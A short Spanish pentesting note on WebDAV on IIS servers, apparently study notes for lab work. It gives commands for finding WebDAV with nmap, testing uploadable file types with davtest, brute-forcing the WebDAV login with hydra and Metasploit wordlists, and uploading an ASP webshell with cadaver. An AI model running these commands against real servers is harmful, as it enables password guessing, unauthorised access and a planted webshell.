Para enumerar esta feature de IISS, primero nos percataremos de su existencia tras la hacer fuzzing sobre el servidor web IIS:

`sudo nmap -sS -p80 --script=http-enum <ip>` 

también podemos usar otras herramientas de fuzzing como gobuster, wfuzz.

Para enumerar utilizaremos dos herramientas:
### davtest
Para analizar ficheros de qué tipo podemos subir, modificar, ejecutar...
`davtest -auth user:pass -url http://10.10.10.1/webdav`

Si no tenemos credenciales, podemos usar hydra para el formulario de login de webdav:
`hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.10.10.1 http-get /webdav/`

### cadaver
Para subir ficheros por ejemplo ficheros maliciosos que subirá en el webdav folder y luego ejecutarlos desde ahí y que los interprete, por ejemplo una webshell:

`cadaver -url http://ip`

Subimos por ejemplo una webshell asp:
`put /usr/share/webshells/asp/webshell.asp`






